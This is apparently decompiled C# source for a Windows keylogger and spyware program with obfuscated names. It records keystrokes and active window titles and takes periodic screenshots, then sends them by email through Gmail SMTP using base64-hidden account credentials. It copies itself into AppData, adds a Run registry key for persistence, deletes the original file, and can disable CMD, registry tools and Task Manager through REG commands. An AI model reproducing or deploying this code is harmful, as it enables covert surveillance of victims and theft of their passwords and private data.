using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

[StandardModule]
internal sealed class cUsIBkSVpSWkuQd
{
	private static string QDezybJaMQpQbVn = "Ym9vbWdvb2RnYW1lQGdtYWlsLmNvbQ==";

	private static string kIdCtqCThDqzYSv = "bG9sbG9sMTk5Ng==";

	private static string xeyEMChqqpuRYfK = "smtp.gmail.com";

	private static int WWmpskJYRBilGim = 587;

	private static string iHWPyhjEglyJerf;

	private static string RsPOpXoaeFfqkDz;

	private static string WrRJFQhwSFPmhLN;

	private static string sNTbQvFGEJgmtYl;

	private static string kBFHyYnfQxzUwCP;

	private static string vlRaaYdPIPtGGVZ;

	private static int grlEnKtFLHSjxGH = 300000;

	private static string zWiwevhlMzxrJHd = null;

	private static object BxgtTTuDPrLqPgG = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static string RojMOuBUcSxstrw = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	private static MailMessage hovMnmDsumMoTRz = new MailMessage();

	private static SmtpClient FkUQFZPGUeNNzmN = new SmtpClient();

	[AccessedThroughProperty("kUQFZPGUeNNzmNj")]
	private static jwLsKvzZOLFXUqN _kUQFZPGUeNNzmNj;

	private static object CORfBDMWRuKcwQK = Path.GetFileName(Application.get_ExecutablePath());

	private static RichTextBox OrWGCqLCsGQyymY = new RichTextBox();

	private static jwLsKvzZOLFXUqN kUQFZPGUeNNzmNj
	{
		get
		{
			return _kUQFZPGUeNNzmNj;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_kUQFZPGUeNNzmNj != null)
			{
				jwLsKvzZOLFXUqN.KeyDown -= ZcUsIBkSVpSWkuQ;
			}
			_kUQFZPGUeNNzmNj = value;
			if (_kUQFZPGUeNNzmNj != null)
			{
				jwLsKvzZOLFXUqN.KeyDown += ZcUsIBkSVpSWkuQ;
			}
		}
	} = new jwLsKvzZOLFXUqN();


	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	[STAThread]
	public static void main()
	{
		//IL_02c5: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cb: Expected O, but got Unknown
		//IL_02ee: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		vlRaaYdPIPtGGVZ = Conversions.ToString(true);
		WrRJFQhwSFPmhLN = Conversions.ToString(true);
		sNTbQvFGEJgmtYl = Conversions.ToString(false);
		kBFHyYnfQxzUwCP = Conversions.ToString(false);
		RsPOpXoaeFfqkDz = Conversions.ToString(true);
		iHWPyhjEglyJerf = Conversions.ToString(true);
		object startupPath = Application.get_StartupPath();
		if (!Operators.ConditionalCompareObjectEqual(startupPath, BxgtTTuDPrLqPgG, false))
		{
			FileStream fileStream = null;
			fileStream = File.Create(Conversions.ToString(Operators.ConcatenateObject(BxgtTTuDPrLqPgG, (object)"\\ovMnmDsumMoTRzn.txt")));
			using (fileStream)
			{
			}
			StreamWriter streamWriter = new StreamWriter(RojMOuBUcSxstrw + "\\ovMnmDsumMoTRzn.txt");
			streamWriter.Write(Application.get_ExecutablePath());
			streamWriter.Flush();
			streamWriter.Close();
			if (File.Exists(Conversions.ToString(Operators.AddObject(Operators.AddObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK))))
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(Operators.AddObject(Operators.AddObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK)));
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK)));
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_FileSystem().CopyFile(Application.get_ExecutablePath(), Conversions.ToString(Operators.AddObject(Operators.AddObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK)));
			}
			NewLateBinding.LateCall((object)null, typeof(Process), "Start", new object[1] { Operators.AddObject(Operators.AddObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK) }, (string[])null, (Type[])null, (bool[])null, true);
			ProjectData.EndApp();
		}
		if (Conversions.ToBoolean(iHWPyhjEglyJerf))
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.GetValue(Conversions.ToString(CORfBDMWRuKcwQK)));
			if (objectValue == null)
			{
				((ServerComputer)MyProject.Computer).get_Registry().SetValue("HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", Conversions.ToString(CORfBDMWRuKcwQK), Operators.ConcatenateObject(Operators.ConcatenateObject(BxgtTTuDPrLqPgG, (object)"\\"), CORfBDMWRuKcwQK));
			}
		}
		if (Conversions.ToBoolean(RsPOpXoaeFfqkDz))
		{
			try
			{
				object obj = ((ServerComputer)MyProject.Computer).get_FileSystem().ReadAllText(Conversions.ToString(Operators.ConcatenateObject(BxgtTTuDPrLqPgG, (object)"\\ovMnmDsumMoTRzn.txt")));
				((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile(Conversions.ToString(obj));
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
		if (Conversions.ToBoolean(WrRJFQhwSFPmhLN))
		{
			Interaction.Shell("REG add HKCU\\Software\\Policies\\Microsoft\\Windows\\System /v DisableCMD /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(sNTbQvFGEJgmtYl))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableRegistryTools /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		if (Conversions.ToBoolean(kBFHyYnfQxzUwCP))
		{
			Interaction.Shell("REG add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t REG_DWORD /d 1 /f", (AppWinStyle)1, false, -1);
		}
		Timer val = new Timer();
		val.set_Interval(300000);
		val.add_Tick((EventHandler)wLsKvzZOLFXUqNl_Ticked);
		val.Start();
		Timer val2 = new Timer();
		val2.set_Interval(300);
		val2.add_Tick((EventHandler)rnyDRmoxHCfvOiC_Ticked);
		val2.Start();
		kUQFZPGUeNNzmNj.lrnyDRmoxHCfvOi();
		Application.Run();
	}

	private static string BWXhFlPeLSksiOJ()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	public static string dQDezybJaMQpQbV(string vJIYceWvLDnVXrU)
	{
		byte[] bytes = Convert.FromBase64String(vJIYceWvLDnVXrU);
		return Encoding.ASCII.GetString(bytes);
	}

	public static void wLsKvzZOLFXUqNl_Ticked(object sender, EventArgs e)
	{
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_007c: Expected O, but got Unknown
		if (Conversions.ToBoolean(vlRaaYdPIPtGGVZ))
		{
			Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
			Graphics val2 = Graphics.FromImage((Image)(object)val);
			Point point = new Point(0, 0);
			Point point2 = new Point(0, 0);
			val2.CopyFromScreen(point, point2, size);
			string text = UnhXDMNLQBtBfsr(6);
			((Image)val).Save(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(BxgtTTuDPrLqPgG, (object)"\\"), (object)text), (object)".jpeg")));
			try
			{
				MailMessage mailMessage = new MailMessage();
				Attachment item = new Attachment(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(BxgtTTuDPrLqPgG, (object)"\\"), (object)text), (object)".jpeg")));
				mailMessage.From = new MailAddress(dQDezybJaMQpQbV(QDezybJaMQpQbVn));
				mailMessage.To.Add(dQDezybJaMQpQbV(QDezybJaMQpQbVn));
				mailMessage.Subject = "COOLogger Logs From - " + Environment.UserName;
				mailMessage.Body = OrWGCqLCsGQyymY.get_Text();
				mailMessage.Attachments.Add(item);
				SmtpClient smtpClient = new SmtpClient("smtp.gmail.com");
				smtpClient.Port = 587;
				smtpClient.EnableSsl = true;
				smtpClient.Credentials = new NetworkCredential(dQDezybJaMQpQbV(QDezybJaMQpQbVn), dQDezybJaMQpQbV(kIdCtqCThDqzYSv));
				smtpClient.EnableSsl = true;
				smtpClient.Send(mailMessage);
				OrWGCqLCsGQyymY.set_Text("");
				return;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return;
			}
		}
		MailMessage mailMessage2 = hovMnmDsumMoTRz;
		mailMessage2.From = new MailAddress(dQDezybJaMQpQbV(QDezybJaMQpQbVn));
		mailMessage2.To.Add(dQDezybJaMQpQbV(QDezybJaMQpQbVn));
		mailMessage2.Subject = "COOLogger Logs from - " + Environment.UserName;
		mailMessage2.Body = OrWGCqLCsGQyymY.get_Text();
		mailMessage2 = null;
		SmtpClient fkUQFZPGUeNNzmN = FkUQFZPGUeNNzmN;
		fkUQFZPGUeNNzmN.Host = "smtp.gmail.com";
		fkUQFZPGUeNNzmN.Port = 587;
		fkUQFZPGUeNNzmN.EnableSsl = true;
		fkUQFZPGUeNNzmN.Credentials = new NetworkCredential(dQDezybJaMQpQbV(QDezybJaMQpQbVn), dQDezybJaMQpQbV(kIdCtqCThDqzYSv));
		fkUQFZPGUeNNzmN.Send(hovMnmDsumMoTRz);
		fkUQFZPGUeNNzmN = null;
		OrWGCqLCsGQyymY.set_Text("");
	}

	public static void ZcUsIBkSVpSWkuQ(Keys e)
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		RichTextBox orWGCqLCsGQyymY = OrWGCqLCsGQyymY;
		orWGCqLCsGQyymY.set_Text(orWGCqLCsGQyymY.get_Text() + kUQFZPGUeNNzmNj.CvlRaaYdPIPtGGV(e));
	}

	public static void rnyDRmoxHCfvOiC_Ticked(object sender, EventArgs e)
	{
		if (Operators.CompareString(zWiwevhlMzxrJHd, BWXhFlPeLSksiOJ(), false) != 0)
		{
			zWiwevhlMzxrJHd = BWXhFlPeLSksiOJ();
			if (Operators.CompareString(zWiwevhlMzxrJHd, "", false) != 0)
			{
				RichTextBox orWGCqLCsGQyymY = OrWGCqLCsGQyymY;
				orWGCqLCsGQyymY.set_Text(orWGCqLCsGQyymY.get_Text() + "\r\n\r\n~~~~~" + zWiwevhlMzxrJHd + " (" + DateAndTime.get_Now().ToLongTimeString() + ")~~~~~\r\n");
			}
		}
	}

	public static string UnhXDMNLQBtBfsr(int lenght)
	{
		VBMath.Randomize();
		StringBuilder stringBuilder = new StringBuilder("");
		char[] array = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".ToCharArray();
		checked
		{
			for (int i = 1; i <= lenght; i++)
			{
				VBMath.Randomize();
				int num = (int)Math.Round(Conversion.Int((float)(array.Length - 2 - 0 + 1) * VBMath.Rnd()) + 1f);
				stringBuilder.Append(array[num]);
			}
			return stringBuilder.ToString();
		}
	}
}
